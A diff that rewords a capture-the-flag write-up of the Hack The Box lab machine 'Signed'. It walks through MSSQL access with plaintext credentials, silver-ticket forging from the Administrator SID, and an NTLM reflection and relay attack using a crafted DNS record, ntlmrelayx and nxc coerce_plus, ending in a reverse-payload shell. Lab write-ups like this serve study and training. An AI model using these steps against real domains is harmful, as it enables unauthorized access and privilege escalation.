@@ -69,7 +69,7 @@ OS and Service detection performed. Please report any incorrect results at https
 impacket-mssqlclient signed.htb/scott:'Sm230#C5NatH'@10.129.242.173 
 ```
 
-**Primary goal**: a silver ticket granting Administrator — the account holding unrestricted access to execute system commands through `xp_cmdshell`.
+**Primary goal**: a silver ticket for Administrator — the account with unrestricted access to run system commands through `xp_cmdshell`.
 
 Requirements:
 - A `dbo` account — the user running the MSSQL service
@@ -141,7 +141,7 @@ SELECT SUSER_SID('SIGNED\Administrator');
 b'0105000000000005150000005b7bb0f398aa2245ad4a1ca4f4010000'
 ```
 
-**SID** hex-strings are stored as **varbinary(85)** — converted with a small helper:
+**SID** hex strings are stored as **varbinary(85)**, so we convert them with a small helper:
 
 ```python
 #!/usr/bin/env python3
@@ -216,17 +216,13 @@ if __name__ == "__main__":
 
 ```
 
-The final component is the **RID** of the Administrator (500) — format: `group id + rid`:
+The final component is Administrator's **RID** (500) — formatted as `group id + rid`:
 
 ```text
 SID: S-1-5-21-4088429403-1159899800-2753317549-500
 ```
 
-Achieved:
-- `dbo` username & password
-- Domain ID of Administrator
-
-Now forge a fresh NTLM hash to impersonate:
+That gives us both requirements: the `dbo` username and password, and the domain ID of Administrator. Now forge a fresh NTLM hash to impersonate:
 
 ```sh
 pypykatz crypto nt 'purPLE9795!@'
@@ -252,7 +248,7 @@ impacket-mssqlclient -k DC01.signed.htb
 
 `-k` — Kerberos authentication using credentials from the ccache file (`KRB5CCNAME`).
 
-Logged in as Administrator — but still carrying guest-level privilege. Checking which login holds `sysadmin`:
+Logged in as Administrator — but still carrying guest-level privilege, so we check which login holds `sysadmin`:
 
 ```sql
 SELECT sp.name, sl.name AS LoginName FROM sys.server_role_members rm JOIN sys.server_principals sp ON rm.role_principal_id = sp.principal_id JOIN sys.server_principals sl ON rm.member_principal_id = sl.principal_id WHERE sp.name='sysadmin';
@@ -331,15 +327,9 @@ SMB signing is enabled by default on the domain controller — classic relaying 
 >
 > https://www.synacktiv.com/en/publications/ntlm-reflection-is-dead-long-live-ntlm-reflection-an-in-depth-analysis-of-cve-2025
 
-In a typical NTLM reflection attack:
-1. Attacker initiates a connection to a target service and receives an NTLM challenge (a random value the server sends to verify identity)
-2. Attacker reflects the challenge back to a legitimate user or system trying to authenticate to the attacker
-3. The user unknowingly signs the challenge using their NTLM credentials
-4. Attacker captures the signed response and relays it back to the original target service, impersonating the legitimate user
+In a typical NTLM reflection attack, the attacker opens a connection to a target service and receives an NTLM challenge — a random value the server sends to verify identity. That challenge is then reflected back to a legitimate user or system trying to authenticate to the attacker, who unknowingly signs it with their own NTLM credentials. The attacker captures the signed response and relays it back to the original target service, impersonating the legitimate user.
 
-Exploitation methodology:
-1. **add** a **DNS entry** pointing back to us
-   - **format**: `<MACHINE NAME>+1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA`
+Exploitation methodology: first, **add** a **DNS entry** pointing back to us, in the **format** `<MACHINE NAME>+1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA`:
 
 ```text
 # localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA
@@ -347,12 +337,7 @@ Exploitation methodology:
 # signed1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA
 ```
 
-2. start **ntlmrelayx** to relay the coerced authentication
-   - What are we relaying it to?
-   - Possibilities:
-     - `MSSQL`, `ESC8`, & **WinRMS**
-     - WinRMS looked interesting — relaying to MSSQL was pointless since we already had sysadmin
-3. Coerce the target using the DNS entry we added
+Next, start **ntlmrelayx** to relay the coerced authentication. What are we relaying it to? The possibilities were `MSSQL`, `ESC8`, and **WinRMS** — WinRMS looked interesting, since relaying to MSSQL was pointless when we already had sysadmin. Finally, coerce the target using the DNS entry we just added.
 
 Once complete, ntlmrelayx's output confirms success — with a WinRM shell available on **127.0.0.1:11000**.
 
@@ -376,6 +361,6 @@ The **coerce_plus** module triggers the NTLM relay — it deals with NTLM authen
 nxc smb 240.0.0.1 -u 'mssqlsvc' -p 'purPLE9795!@' -m coerce_plus -o L=dc011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA M=pe
 ```
 
-The target was vulnerable — ntlmrelayx received the WinRM connection and forwarded it to localhost:1100 with administrator-level NTLM authentication. Connected to the forwarded WinRM service and upgraded to a proper shell with a reverse payload.
+The target was vulnerable — ntlmrelayx received the WinRM connection and forwarded it to localhost:1100 with administrator-level NTLM authentication. We then connected to the forwarded WinRM service and upgraded to a proper shell with a reverse payload.
 
 Gained `root`
